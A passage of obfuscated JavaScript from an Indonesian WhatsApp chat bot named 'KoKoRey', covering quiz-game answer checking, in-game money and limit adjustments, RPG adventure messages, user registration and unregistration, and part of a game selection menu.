      if (_0x3f87c6.quoted.id == tebakgambar[_0x3f87c6.chat][0x0].key.id) {
        let _0x2b3e1b = JSON.parse(JSON.stringify(tebakgambar[_0x3f87c6.chat][0x1]));
        jawaban = _0x2b3e1b.jawaban.toLowerCase().trim();
        if (_0x7a39b5.toLowerCase() == jawaban) {
          db.data.users[_0x3f87c6.sender].uang += tebakgambar[_0x3f87c6.chat][0x2];
          _0x5df220("Tebak Gambar", tebakgambar[_0x3f87c6.chat][0x2], "\n\nKirim perintah .tebakgambar\nuntuk bermain lagi 🎮");
          clearTimeout(tebakgambar[_0x3f87c6.chat][0x3]);
          delete tebakgambar[_0x3f87c6.chat];
        } else {
          if (similarity(_0x7a39b5.toLowerCase(), jawaban) >= 0.72) {
            _0x3a091f("_Ya, Dikit Lagi!_");
          } else {
            _0x3f87c6.react('❌');
          }
        }
      }
    }
    if (tebakkata[_0x3f87c6.chat] && !_0x2bee7f && _0x3f87c6.quoted) {
      if (_0x3f87c6.quoted.id == tebakkata[_0x3f87c6.chat][0x0].key.id) {
        let _0x5548c1 = JSON.parse(JSON.stringify(tebakkata[_0x3f87c6.chat][0x1]));
        jawaban = _0x5548c1.jawaban.toLowerCase().trim();
        if (_0x7a39b5.toLowerCase() == jawaban) {
          db.data.users[_0x3f87c6.sender].uang += tebakkata[_0x3f87c6.chat][0x2];
          _0x5df220("Tebak Kata", tebakkata[_0x3f87c6.chat][0x2], "\n\nKirim perintah .tebakkata\nuntuk bermain lagi 🎮");
          clearTimeout(tebakkata[_0x3f87c6.chat][0x3]);
          delete tebakkata[_0x3f87c6.chat];
        } else {
          if (similarity(_0x7a39b5.toLowerCase(), jawaban) >= 0.72) {
            _0x3a091f("_Ya, Dikit Lagi!_");
          } else {
            _0x3f87c6.react('❌');
          }
        }
      }
    }
    if (asahotak[_0x3f87c6.chat] && !_0x2bee7f && _0x3f87c6.quoted) {
      if (_0x3f87c6.quoted.id == asahotak[_0x3f87c6.chat][0x0].key.id) {
        let _0x1f45b5 = JSON.parse(JSON.stringify(asahotak[_0x3f87c6.chat][0x1]));
        jawaban = _0x1f45b5.jawaban.toLowerCase().trim();
        if (_0x7a39b5.toLowerCase() == jawaban) {
          db.data.users[_0x3f87c6.sender].uang += asahotak[_0x3f87c6.chat][0x2];
          _0x5df220("Asah Otak", asahotak[_0x3f87c6.chat][0x2], "\n\nKirim perintah .asahotak\nuntuk bermain lagi 🎮");
          clearTimeout(asahotak[_0x3f87c6.chat][0x3]);
          delete asahotak[_0x3f87c6.chat];
        } else {
          if (similarity(_0x7a39b5.toLowerCase(), jawaban) >= 0.72) {
            _0x3a091f("_Ya, Dikit Lagi!_");
          } else {
            _0x3f87c6.react('❌');
          }
        }
      }
    }
    if (lengkapikalimat[_0x3f87c6.chat] && !_0x2bee7f && _0x3f87c6.quoted) {
      if (_0x3f87c6.quoted.id == lengkapikalimat[_0x3f87c6.chat][0x0].key.id) {
        let _0x1d992c = JSON.parse(JSON.stringify(lengkapikalimat[_0x3f87c6.chat][0x1]));
        jawaban = _0x1d992c.jawaban.toLowerCase().trim();
        if (_0x7a39b5.toLowerCase() == jawaban) {
          db.data.users[_0x3f87c6.sender].uang += lengkapikalimat[_0x3f87c6.chat][0x2];
          _0x5df220("Lengkapi Kalimat", lengkapikalimat[_0x3f87c6.chat][0x2], "\n\nKirim perintah .lengkapikalimat\nuntuk bermain lagi 🎮");
          clearTimeout(lengkapikalimat[_0x3f87c6.chat][0x3]);
          delete lengkapikalimat[_0x3f87c6.chat];
        } else {
          if (similarity(_0x7a39b5.toLowerCase(), jawaban) >= 0.72) {
            _0x3a091f("_Ya, Dikit Lagi!_");
          } else {
            _0x3f87c6.react('❌');
          }
        }
      }
    }
    if (tebakbendera[_0x3f87c6.chat] && !_0x2bee7f && _0x3f87c6.quoted) {
      if (_0x3f87c6.quoted.id == tebakbendera[_0x3f87c6.chat][0x0].key.id) {
        let _0x439989 = JSON.parse(JSON.stringify(tebakbendera[_0x3f87c6.chat][0x1]));
        jawaban = _0x439989.name.toLowerCase().trim();
        if (_0x7a39b5.toLowerCase() == jawaban) {
          db.data.users[_0x3f87c6.sender].uang += tebakbendera[_0x3f87c6.chat][0x2];
          _0x5df220("Tebak Bendera", tebakbendera[_0x3f87c6.chat][0x2], "\n\nKirim perintah .tebakbendera\nuntuk bermain lagi 🎮");
          clearTimeout(tebakbendera[_0x3f87c6.chat][0x3]);
          delete tebakbendera[_0x3f87c6.chat];
        } else {
          if (similarity(_0x7a39b5.toLowerCase(), jawaban) >= 0.72) {
            _0x3a091f("_Ya, Dikit Lagi!_");
          } else {
            _0x3f87c6.react('❌');
          }
        }
      }
    }
    if (caklontong[_0x3f87c6.chat] && !_0x2bee7f && _0x3f87c6.quoted) {
      if (_0x3f87c6.quoted.id == caklontong[_0x3f87c6.chat][0x0].key.id) {
        let _0x4529e9 = JSON.parse(JSON.stringify(caklontong[_0x3f87c6.chat][0x1]));
        jawaban = _0x4529e9.jawaban.toLowerCase().trim();
        if (_0x7a39b5.toLowerCase() == jawaban) {
          db.data.users[_0x3f87c6.sender].uang += caklontong[_0x3f87c6.chat][0x2];
          _0x5df220("Cak Lontong", caklontong[_0x3f87c6.chat][0x2], "\n\nKirim perintah .caklontong\nuntuk bermain lagi 🎮");
          clearTimeout(caklontong[_0x3f87c6.chat][0x3]);
          delete caklontong[_0x3f87c6.chat];
        } else {
          if (similarity(_0x7a39b5.toLowerCase(), jawaban) >= 0.72) {
            _0x3a091f("_Ya, Dikit Lagi!_");
          } else {
            _0x3f87c6.react('❌');
          }
        }
      }
    }
    if (susunkata[_0x3f87c6.chat] && !_0x2bee7f && _0x3f87c6.quoted) {
      if (_0x3f87c6.quoted.id == susunkata[_0x3f87c6.chat][0x0].key.id) {
        let _0x41135c = JSON.parse(JSON.stringify(susunkata[_0x3f87c6.chat][0x1]));
        jawaban = _0x41135c.jawaban.toLowerCase().trim();
        if (_0x7a39b5.toLowerCase() == jawaban) {
          db.data.users[_0x3f87c6.sender].uang += susunkata[_0x3f87c6.chat][0x2];
          _0x5df220("Susun Kata", susunkata[_0x3f87c6.chat][0x2], "\n\nKirim perintah .susunkata\nuntuk bermain lagi 🎮");
          clearTimeout(susunkata[_0x3f87c6.chat][0x3]);
          delete susunkata[_0x3f87c6.chat];
        } else {
          if (similarity(_0x7a39b5.toLowerCase(), jawaban) >= 0.72) {
            _0x3a091f("_Ya, Dikit Lagi!_");
          } else {
            _0x3f87c6.react('❌');
          }
        }
      }
    }
    if (tebakkalimat[_0x3f87c6.chat] && !_0x2bee7f && _0x3f87c6.quoted) {
      if (_0x3f87c6.quoted.id == tebakkalimat[_0x3f87c6.chat][0x0].key.id) {
        let _0x280b14 = JSON.parse(JSON.stringify(tebakkalimat[_0x3f87c6.chat][0x1]));
        jawaban = _0x280b14.jawaban.toLowerCase().trim();
        if (_0x7a39b5.toLowerCase() == jawaban) {
          db.data.users[_0x3f87c6.sender].uang += tebakkalimat[_0x3f87c6.chat][0x2];
          _0x5df220("Tebak Kalimat", tebakkalimat[_0x3f87c6.chat][0x2], "\n\nKirim perintah .tebakkalimat\nuntuk bermain lagi 🎮");
          clearTimeout(tebakkalimat[_0x3f87c6.chat][0x3]);
          delete tebakkalimat[_0x3f87c6.chat];
        } else {
          if (similarity(_0x7a39b5.toLowerCase(), jawaban) >= 0.72) {
            _0x3a091f("_Ya, Dikit Lagi!_");
          } else {
            _0x3f87c6.react('❌');
          }
        }
      }
    }
    if (siapaaku[_0x3f87c6.chat] && !_0x2bee7f && _0x3f87c6.quoted) {
      if (_0x3f87c6.quoted.id == siapaaku[_0x3f87c6.chat][0x0].key.id) {
        let _0x243c9c = JSON.parse(JSON.stringify(siapaaku[_0x3f87c6.chat][0x1]));
        jawaban = _0x243c9c.jawaban.toLowerCase().trim();
        if (_0x7a39b5.toLowerCase() == jawaban) {
          db.data.users[_0x3f87c6.sender].uang += siapaaku[_0x3f87c6.chat][0x2];
          _0x5df220("Tebak Siapa", siapaaku[_0x3f87c6.chat][0x2], "\n\nKirim perintah .tebaksiapa\nuntuk bermain lagi 🎮");
          clearTimeout(siapaaku[_0x3f87c6.chat][0x3]);
          delete siapaaku[_0x3f87c6.chat];
        } else {
          if (similarity(_0x7a39b5.toLowerCase(), jawaban) >= 0.72) {
            _0x3a091f("_Ya, Dikit Lagi!_");
          } else {
            _0x3f87c6.react('❌');
          }
        }
      }
    }
    if (tekateki[_0x3f87c6.chat] && !_0x2bee7f && _0x3f87c6.quoted) {
      if (_0x3f87c6.quoted.id == tekateki[_0x3f87c6.chat][0x0].key.id) {
        let _0x204cb3 = JSON.parse(JSON.stringify(tekateki[_0x3f87c6.chat][0x1]));
        jawaban = _0x204cb3.jawaban.toLowerCase().trim();
        if (_0x7a39b5.toLowerCase() == jawaban) {
          db.data.users[_0x3f87c6.sender].uang += tekateki[_0x3f87c6.chat][0x2];
          _0x5df220("Teka Teki", tekateki[_0x3f87c6.chat][0x2], "\n\nKirim perintah .tekateki\nuntuk bermain lagi 🎮");
          clearTimeout(tekateki[_0x3f87c6.chat][0x3]);
          delete tekateki[_0x3f87c6.chat];
        } else {
          if (similarity(_0x7a39b5.toLowerCase(), jawaban) >= 0.72) {
            _0x3a091f("_Ya, Dikit Lagi!_");
          } else {
            _0x3f87c6.react('❌');
          }
        }
      }
    }
    if (tebakkimia[_0x3f87c6.chat] && !_0x2bee7f && _0x3f87c6.quoted) {
      if (_0x3f87c6.quoted.id == tebakkimia[_0x3f87c6.chat][0x0].key.id) {
        let _0x5ccb72 = JSON.parse(JSON.stringify(tebakkimia[_0x3f87c6.chat][0x1]));
        jawaban = _0x5ccb72.unsur.toLowerCase().trim();
        if (_0x7a39b5.toLowerCase() == jawaban) {
          db.data.users[_0x3f87c6.sender].uang += tebakkimia[_0x3f87c6.chat][0x2];
          _0x5df220("Teka Kimia", tebakkimia[_0x3f87c6.chat][0x2], "\n\nKirim perintah .tebakkimia\nuntuk bermain lagi 🎮");
          clearTimeout(tebakkimia[_0x3f87c6.chat][0x3]);
          delete tebakkimia[_0x3f87c6.chat];
        } else {
          if (similarity(_0x7a39b5.toLowerCase(), jawaban) >= 0.72) {
            _0x3a091f("_Ya, Dikit Lagi!_");
          } else {
            _0x3f87c6.react('❌');
          }
        }
      }
    }
    if (tebaklirik[_0x3f87c6.chat] && !_0x2bee7f && _0x3f87c6.quoted) {
      if (_0x3f87c6.quoted.id == tebaklirik[_0x3f87c6.chat][0x0].key.id) {
        let _0x196a82 = JSON.parse(JSON.stringify(tebaklirik[_0x3f87c6.chat][0x1]));
        jawaban = _0x196a82.jawaban.toLowerCase().trim();
        if (_0x7a39b5.toLowerCase() == jawaban) {
          db.data.users[_0x3f87c6.sender].uang += tebaklirik[_0x3f87c6.chat][0x2];
          _0x5df220("Teka Lirik", tebaklirik[_0x3f87c6.chat][0x2], "\n\nKirim perintah .tebaklirik\nuntuk bermain lagi 🎮");
          clearTimeout(tebaklirik[_0x3f87c6.chat][0x3]);
          delete tebaklirik[_0x3f87c6.chat];
        } else {
          if (similarity(_0x7a39b5.toLowerCase(), jawaban) >= 0.72) {
            _0x3a091f("_Ya, Dikit Lagi!_");
          } else {
            _0x3f87c6.react('❌');
          }
        }
      }
    }
    if (tebaktebakan[_0x3f87c6.chat] && !_0x2bee7f && _0x3f87c6.quoted) {
      if (_0x3f87c6.quoted.id == tebaktebakan[_0x3f87c6.chat][0x0].key.id) {
        let _0x507ee1 = JSON.parse(JSON.stringify(tebaktebakan[_0x3f87c6.chat][0x1]));
        jawaban = _0x507ee1.jawaban.toLowerCase().trim();
        if (_0x7a39b5.toLowerCase() == jawaban) {
          db.data.users[_0x3f87c6.sender].uang += tebaktebakan[_0x3f87c6.chat][0x2];
          _0x5df220("Teka Tebakan", tebaktebakan[_0x3f87c6.chat][0x2], "\n\nKirim perintah .tebaktebakan\nuntuk bermain lagi 🎮");
          clearTimeout(tebaktebakan[_0x3f87c6.chat][0x3]);
          delete tebaktebakan[_0x3f87c6.chat];
        } else {
          if (similarity(_0x7a39b5.toLowerCase(), jawaban) >= 0.72) {
            _0x3a091f("_Ya, Dikit Lagi!_");
          } else {
            _0x3f87c6.react('❌');
          }
        }
      }
    }
    async function _0x27e2d1(_0x4c3f2a) {
      if (tekateki[_0x4c3f2a]) {
        _0x59f5fa.sendMessage(_0x4c3f2a, {
          'text': "Soal ini belum selesai, selesaikan dulu sebelum lanjut lagi ya kak~"
        }, {
          'quoted': tekateki[_0x4c3f2a][0x0]
        });
        return true;
      } else {
        if (caklontong[_0x4c3f2a]) {
          _0x59f5fa.sendMessage(_0x4c3f2a, {
            'text': "Soal ini belum selesai, selesaikan dulu sebelum lanjut lagi ya kak~"
          }, {
            'quoted': caklontong[_0x4c3f2a][0x0]
          });
          return true;
        } else {
          if (susunkata[_0x4c3f2a]) {
            _0x59f5fa.sendMessage(_0x4c3f2a, {
              'text': "Soal ini belum selesai, selesaikan dulu sebelum lanjut lagi ya kak~"
            }, {
              'quoted': susunkata[_0x4c3f2a][0x0]
            });
            return true;
          } else {
            if (mathgame[_0x4c3f2a]) {
              _0x59f5fa.sendMessage(_0x4c3f2a, {
                'text': "Soal Mathgame belum selesai"
              }, {
                'quoted': mathgame[_0x4c3f2a][0x0]
              });
              return true;
            } else {
              if (tebaktebakan[_0x4c3f2a]) {
                _0x59f5fa.sendMessage(_0x4c3f2a, {
                  'text': "Soal ini belum selesai, selesaikan dulu sebelum lanjut lagi ya kak~"
                }, {
                  'quoted': tebaktebakan[_0x4c3f2a][0x0]
                });
                return true;
              } else {
                if (tebaklirik[_0x4c3f2a]) {
                  _0x59f5fa.sendMessage(_0x4c3f2a, {
                    'text': "Soal ini belum selesai, selesaikan dulu sebelum lanjut lagi ya kak~"
                  }, {
                    'quoted': tebaklirik[_0x4c3f2a][0x0]
                  });
                  return true;
                } else {
                  if (tebakkimia[_0x4c3f2a]) {
                    _0x59f5fa.sendMessage(_0x4c3f2a, {
                      'text': "Soal ini belum selesai, selesaikan dulu sebelum lanjut lagi ya kak~"
                    }, {
                      'quoted': tebakkimia[_0x4c3f2a][0x0]
                    });
                    return true;
                  } else {
                    if (siapaaku[_0x4c3f2a]) {
                      _0x59f5fa.sendMessage(_0x4c3f2a, {
                        'text': "Soal ini belum selesai, selesaikan dulu sebelum lanjut lagi ya kak~"
                      }, {
                        'quoted': siapaaku[_0x4c3f2a][0x0]
                      });
                      return true;
                    } else {
                      if (tebakkalimat[_0x4c3f2a]) {
                        _0x59f5fa.sendMessage(_0x4c3f2a, {
                          'text': "Soal ini belum selesai, selesaikan dulu sebelum lanjut lagi ya kak~"
                        }, {
                          'quoted': tebakkalimat[_0x4c3f2a][0x0]
                        });
                        return true;
                      } else {
                        if (tebakbendera[_0x4c3f2a]) {
                          _0x59f5fa.sendMessage(_0x4c3f2a, {
                            'text': "Soal ini belum selesai, selesaikan dulu sebelum lanjut lagi ya kak~"
                          }, {
                            'quoted': tebakbendera[_0x4c3f2a][0x0]
                          });
                          return true;
                        } else {
                          if (tebakkata[_0x4c3f2a]) {
                            _0x59f5fa.sendMessage(_0x4c3f2a, {
                              'text': "Soal ini belum selesai, selesaikan dulu sebelum lanjut lagi ya kak~"
                            }, {
                              'quoted': tebakkata[_0x4c3f2a][0x0]
                            });
                            return true;
                          } else {
                            if (asahotak[_0x4c3f2a]) {
                              _0x59f5fa.sendMessage(_0x4c3f2a, {
                                'text': "Soal ini belum selesai, selesaikan dulu sebelum lanjut lagi ya kak~"
                              }, {
                                'quoted': asahotak[_0x4c3f2a][0x0]
                              });
                              return true;
                            } else {
                              if (lengkapikalimat[_0x4c3f2a]) {
                                _0x59f5fa.sendMessage(_0x4c3f2a, {
                                  'text': "Soal ini belum selesai, selesaikan dulu sebelum lanjut lagi ya kak~"
                                }, {
                                  'quoted': lengkapikalimat[_0x4c3f2a][0x0]
                                });
                                return true;
                              } else {
                                if (tebakgame[_0x4c3f2a]) {
                                  _0x59f5fa.sendMessage(_0x4c3f2a, {
                                    'text': "Soal ini belum selesai, selesaikan dulu sebelum lanjut lagi ya kak~"
                                  }, {
                                    'quoted': tebakgame[_0x4c3f2a][0x0]
                                  });
                                  return true;
                                } else {
                                  if (tebakhero[_0x4c3f2a]) {
                                    _0x59f5fa.sendMessage(_0x4c3f2a, {
                                      'text': "Soal ini belum selesai, selesaikan dulu sebelum lanjut lagi ya kak~"
                                    }, {
                                      'quoted': tebakhero[_0x4c3f2a][0x0]
                                    });
                                    return true;
                                  } else {
                                    if (tebakff[_0x4c3f2a]) {
                                      _0x59f5fa.sendMessage(_0x4c3f2a, {
                                        'text': "Soal ini belum selesai, selesaikan dulu sebelum lanjut lagi ya kak~"
                                      }, {
                                        'quoted': tebakff[_0x4c3f2a][0x0]
                                      });
                                      return true;
                                    } else {
                                      if (tebakkabupaten[_0x4c3f2a]) {
                                        _0x59f5fa.sendMessage(_0x4c3f2a, {
                                          'text': "Soal ini belum selesai, selesaikan dulu sebelum lanjut lagi ya kak~"
                                        }, {
                                          'quoted': tebakkabupaten[_0x4c3f2a][0x0]
                                        });
                                        return true;
                                      } else {
                                        if (tebakjkt48[_0x4c3f2a]) {
                                          _0x59f5fa.sendMessage(_0x4c3f2a, {
                                            'text': "Soal ini belum selesai, selesaikan dulu sebelum lanjut lagi ya kak~"
                                          }, {
                                            'quoted': tebakjkt48[_0x4c3f2a][0x0]
                                          });
                                          return true;
                                        } else {
                                          if (tebakhewan[_0x4c3f2a]) {
                                            _0x59f5fa.sendMessage(_0x4c3f2a, {
                                              'text': "Soal ini belum selesai, selesaikan dulu sebelum lanjut lagi ya kak~"
                                            }, {
                                              'quoted': tebakhewan[_0x4c3f2a][0x0]
                                            });
                                            return true;
                                          } else {
                                            if (tebakml[_0x4c3f2a]) {
                                              _0x59f5fa.sendMessage(_0x4c3f2a, {
                                                'text': "Soal ini belum selesai, selesaikan dulu sebelum lanjut lagi ya kak~"
                                              }, {
                                                'quoted': tebakml[_0x4c3f2a][0x0]
                                              });
                                              return true;
                                            } else {
                                              if (tebakchara[_0x4c3f2a]) {
                                                _0x59f5fa.sendMessage(_0x4c3f2a, {
                                                  'text': "Soal ini belum selesai, selesaikan dulu sebelum lanjut lagi ya kak~"
                                                }, {
                                                  'quoted': tebakchara[_0x4c3f2a][0x0]
                                                });
                                                return true;
                                              } else {
                                                if (tebaklogo[_0x4c3f2a]) {
                                                  _0x59f5fa.sendMessage(_0x4c3f2a, {
                                                    'text': "Soal ini belum selesai, selesaikan dulu sebelum lanjut lagi ya kak~"
                                                  }, {
                                                    'quoted': tebaklogo[_0x4c3f2a][0x0]
                                                  });
                                                  return true;
                                                } else {
                                                  if (tebakaplikasi[_0x4c3f2a]) {
                                                    _0x59f5fa.sendMessage(_0x4c3f2a, {
                                                      'text': "Soal ini belum selesai, selesaikan dulu sebelum lanjut lagi ya kak~"
                                                    }, {
                                                      'quoted': tebakaplikasi[_0x4c3f2a][0x0]
                                                    });
                                                    return true;
                                                  } else {
                                                    return tebakgambar[_0x4c3f2a] ? (_0x59f5fa.sendMessage(_0x4c3f2a, {
                                                      'text': "Soal ini belum selesai, selesaikan dulu sebelum lanjut lagi ya kak~"
                                                    }, {
                                                      'quoted': tebakgambar[_0x4c3f2a][0x0]
                                                    }), true) : false;
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    const _0x42c746 = (_0x4d5462, _0x588656, _0x406066) => {
      let _0x5b68a6 = _0x588656 + "@s.whatsapp.net";
      if (_0x4d5462 === "add") {
        db.data.users[_0x5b68a6].limit += Number(_0x406066);
        return _0x3a091f("✅ Limit user berhasil ditambahkan! 🎯");
      }
      if (_0x4d5462 === "del") {
        if (db.data.users[_0x5b68a6].limit < _0x406066) {
          return _0x3a091f("⚠️ Limit tidak mencukupi.");
        }
        db.data.users[_0x5b68a6].limit -= Number(_0x406066);
        return _0x3a091f("✅ Limit user berhasil dikurangi! ✂️");
      }
      if (_0x4d5462 === "reset") {
        const _0x5753e1 = db.data.users[_0x5b68a6].vip ? global.limit.vip : checkPremiumUser(_0x5b68a6, premium) ? global.limit.premium : global.limit.free;
        db.data.users[_0x5b68a6].limit = _0x5753e1;
        return _0x3a091f("✅ Limit user berhasil direset! ✂️");
      }
    };
    const _0x1ac163 = (_0x54df02, _0x8e8b9e, _0x2f5f7c) => {
      let _0x8c441 = _0x8e8b9e + "@s.whatsapp.net";
      if (_0x54df02 === 'add') {
        db.data.users[_0x8c441].uang += Number(_0x2f5f7c);
        return _0x3a091f("✅ Uang user berhasil ditambahkan! 🎯");
      }
      if (_0x54df02 === 'del') {
        if (db.data.users[_0x8c441].uang < _0x2f5f7c) {
          return _0x3a091f("⚠️ Uang tidak mencukupi.");
        }
        db.data.users[_0x8c441].uang -= Number(_0x2f5f7c);
        return _0x3a091f("✅ Uang user berhasil dikurangi! ✂️");
      }
      if (_0x54df02 === "reset") {
        const _0x49f047 = db.data.users[_0x8c441].vip ? global.uang.vip : checkPremiumUser(_0x8c441, premium) ? global.uang.premium : global.uang.free;
        db.data.users[_0x8c441].uang = _0x49f047;
        return _0x3a091f("✅ Uang user berhasil direset! ✂️");
      }
    };
    async function _0x216f9b(_0x5ae080, _0x10b805, _0x489dad, _0x7788cf) {
      await _0x59f5fa.sendMessage(_0x5ae080, {
        'text': "-「 *ADVENTURE* 」-\n\n*" + _0x10b805 + "*\n" + _0x489dad + "\n\n📌 *Contoh:* _.adventure savanah_",
        'contextInfo': {
          'externalAdReply': {
            'title': "RPG - ADVENTURE",
            'body': "Ayo mulai petualanganmu!",
            'thumbnailUrl': _0x7788cf,
            'sourceUrl': wagc,
            'mediaType': 0x1,
            'renderLargerThumbnail': true
          }
        }
      }, {
        'quoted': _0x3f87c6
      });
    }
    ;
    async function _0x5ea5c2(_0x132a93, _0x3ed0b7, _0x4e8427, _0x30f214) {
      let {
        key: _0x3ffdd6
      } = await _0x59f5fa.sendMessage(_0x132a93, {
        'text': "🧭 Berpetualang, Mohon Tunggu..."
      }, {
        'quoted': _0x3f87c6
      });
      await sleep(0xbb8);
      await _0x59f5fa.sendMessage(_0x132a93, {
        'text': "⚔️ Kamu bertemu dengan *" + _0x4e8427.musuh + '*',
        'edit': _0x3ffdd6
      });
      await sleep(0x1388);
      await _0x59f5fa.sendMessage(_0x132a93, {
        'text': "🔎 Menjelajah...",
        'edit': _0x3ffdd6
      });
      await sleep(0xbb8);
      let _0x467f7b = "-「 *ADVENTURE* 」-\n\n📍 *" + _0x3ed0b7 + "*\n\n🪵 Kayu: " + _0x4e8427.kayu + "\n⛓️ Besi: " + _0x4e8427.besi + "\n🏆 Rank: " + _0x4e8427.rank + "\n💰 Uang: Rp " + _0x4e8427.saldo + "\n\n⚡ *Stamina berkurang -20*";
      await _0x216f9b(_0x132a93, _0x467f7b, '', _0x30f214);
    }
    ;
    switch (_0x4ac520) {
      case "daftar":
        {
          if (db.data.users[_0x3f87c6.sender].daftar) {
            return _0x3a091f("Kamu udah terdaftar kok! KoKoRey seneng banget bisa bantu Kamu. 😜");
          }
          let [_0x44a5cc, _0x2ae54b, _0x4abaff] = _0x2b2627.split(',');
          if (!_0x44a5cc || !_0x2ae54b || !_0x4abaff) {
            let _0x3e308f = "Halo kak, KoKoRey kasih tahu cara daftarnya ya:\n\n";
            _0x3e308f += "Ketik:\n" + (_0x4773c6 + _0x4ac520) + " nama,umur,askot\n\n";
            _0x3e308f += "Contoh:\n" + (_0x4773c6 + _0x4ac520) + " KoKoRey,16,Jakarta";
            return _0x3a091f(_0x3e308f);
          }
          if (isNaN(_0x2ae54b)) {
            return _0x3a091f("Umur yang Kamu masukin itu gak valid deh. Coba dicek lagi ya! 🤔");
          }
          if (_0x2ae54b < 0xa) {
            return _0x3a091f("Hihi, maaf ya kak, KoKoRey cuma bisa bantu Kamu yang umurnya di atas 10 tahun. Tunggu besar dulu ya! 😄");
          }
          if (_0x2ae54b > 0x32) {
            return _0x3a091f("Wah kak, KoKoRey kira umur segitu mending istirahat aja. Jaga kesehatan ya! 🥰");
          }
          try {
            db.data.users[_0x3f87c6.sender].nama = _0x44a5cc;
            db.data.users[_0x3f87c6.sender].umur = Number(_0x2ae54b);
            db.data.users[_0x3f87c6.sender].askot = _0x4abaff;
            db.data.users[_0x3f87c6.sender].daftar = true;
            db.data.users[_0x3f87c6.sender].uang = (db.data.users[_0x3f87c6.sender].uang || 0x0) + 0x1388;
            db.data.users[_0x3f87c6.sender].limit = (db.data.users[_0x3f87c6.sender].limit || 0x0) + 0x14;
            if (verifyNumber[_0x3f87c6.sender]) {
              clearTimeout(verifyNumber[_0x3f87c6.sender][0x4]);
              delete verifyNumber[_0x3f87c6.sender];
            }
            let _0x1ffc7d = "Yeay, Kamu berhasil daftar! 🎉\n\n";
            _0x1ffc7d += "📦 *Info User*:\n";
            _0x1ffc7d += "- *Nama*: " + _0x44a5cc + "\n";
            _0x1ffc7d += "- *Asal*: " + _0x4abaff + "\n";
            _0x1ffc7d += "- *Nomor*: " + _0x3f87c6.sender.split('@')[0x0] + "\n";
            _0x1ffc7d += "- *Umur*: " + _0x2ae54b + "\n\n";
            _0x1ffc7d += "🎁 *Bonus Daftar:*\n";
            _0x1ffc7d += "- Rp. 5000 uang\n";
            _0x1ffc7d += "- 20 Limit tambahan\n\n";
            _0x1ffc7d += "Terima kasih udah daftar ya kak! Semoga KoKoRey bisa bantu Kamu terus. 🥰";
            _0x3a091f(_0x1ffc7d);
            if (notifRegister) {
              try {
                let _0x3c3e65;
                try {
                  _0x3c3e65 = await _0x59f5fa.profilePictureUrl(_0x3f87c6.sender, "image");
                } catch {
                  _0x3c3e65 = imageUrl;
                }
                let _0x1772d3 = "Ada user baru yang daftar nih! 🎉\n\n";
                _0x1772d3 += "- *Nama*: " + _0x44a5cc + "\n";
                _0x1772d3 += "- *Umur*: " + _0x2ae54b + "\n";
                _0x1772d3 += "- *Tag*: @" + _0x3f87c6.sender.split('@')[0x0] + "\n\n";
                _0x1772d3 += "Selamat bergabung di sistem KoKoRey! 🥳";
                _0x59f5fa.sendMessage(ownerNumber + '@s.whatsapp.net', {
                  'text': _0x1772d3,
                  'contextInfo': {
                    'mentionedJid': [_0x3f87c6.sender],
                    'forwardingScore': 0x98967f,
                    'isForwarded': true,
                    'externalAdReply': {
                      'showAdAttribution': true,
                      'containsAutoReply': true,
                      'title': "Notifikasi Pendaftaran",
                      'body': "Waktu: " + date + " " + time,
                      'previewType': "PHOTO",
                      'thumbnailUrl': _0x3c3e65,
                      'sourceUrl': wagc
                    }
                  }
                });
              } catch (_0x5f4de2) {
                console.log("Gagal mengirim notifikasi pendaftaran:", _0x5f4de2);
              }
            }
          } catch (_0x1766cc) {
            console.log("Error waktu daftar:", _0x1766cc);
            _0x3a091f("Aduh kak, ada yang error nih. KoKoRey coba benerin dulu ya! 🙏");
          }
        }
        break;
      case "unregister":
      case "unreg":
      case "hapusakun":
        {
          let _0x33c921 = '';
          if (!_0x143458[0x0]) {
            _0x33c921 += "Kamu perlu masukin nomor telepon yang mau dihapus ya! 😊\n\n";
            _0x33c921 += "*Contoh:*\n";
            _0x33c921 += _0x4773c6 + _0x4ac520 + " 6281234567890";
            return _0x3a091f(_0x33c921);
          }
          let _0x3dc98e = _0x143458[0x0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
          if (!db.data.users[_0x3dc98e]?.['daftar']) {
            _0x33c921 += "Hmm, nomor *" + _0x143458[0x0] + "* belum terdaftar kok, kak. 😊";
            return _0x3a091f(_0x33c921);
          }
          try {
            delete db.data.users[_0x3dc98e];
            _0x33c921 += "Data pengguna dengan nomor *" + _0x143458[0x0] + "* berhasil dihapus! 😊";
            _0x3a091f(_0x33c921);
          } catch (_0x2db91d) {
            console.error(_0x2db91d);
            _0x33c921 += "Duh, KoKoRey gagal hapus data pengguna ini. Coba lagi nanti ya, kak. 😔";
            _0x3a091f(_0x33c921);
          }
          break;
        }
      case "game":
      case "tebak":
        {
          try {
            const _0x20427c = [{
              'name': "single_select",
              'buttonParamsJson': JSON.stringify({
                'title': "🎮 Pilih Game Seru!",
                'sections': [{
                  'title': "🧩 Tebakan Umum",
                  'rows': [{
                    'header': "📍 Tebak Kabupaten",
                    'title': "Tebak nama kabupaten di Indonesia!",
                    'id': ".tebakkabupaten"
                  }, {
                    'header': "🎤 Tebak JKT48",
                    'title': "Uji pengetahuanmu tentang JKT48!",
                    'id': ".tebakjkt48"
                  }, {
                    'header': "🐾 Tebak Hewan",
                    'title': "Tebak hewan dari ciri-cirinya!",
                    'id': ".tebakhewan"
                  }, {
                    'header': "🛡️ Tebak ML",
                    'title': "Tebak hero Mobile Legends!",
                    'id': ".tebakml"
                  }, {
                    'header': "🎭 Tebak Chara",
                    'title': "Kenali karakter anime & game!",
                    'id': ".tebakchara"
                  }, {
                    'header': "🏢 Tebak Logo",
                    'title': "Tebak logo dari berbagai brand!",
                    'id': ".tebaklogo"
                  }, {
                    'header': "📱 Tebak Aplikasi",
                    'title': "Tebak nama aplikasi dari ikon!",
                    'id': ".tebakaplikasi"
                  }]
                }, {
                  'title': "🔥 Game Populer",
                  'rows': [{
                    'header': "💥 Tebak FF",
                    'title': "Tebak item dan karakter Free Fire!",
                    'id': ".tebakff"
                  }, {
                    'header': "⚔️ Tebak Hero",
                    'title': "Kenali hero dari berbagai game!",
                    'id': ".tebakhero"
                  }, {
                    'header': "🎮 Tebak Game",
                    'title': "Tebak judul game dari petunjuk!",
                    'id': ".tebakgame"
                  }, {
                    'header': "🖼️ Tebak Gambar",
                    'title': "Tebak apa yang ada di gambar!",
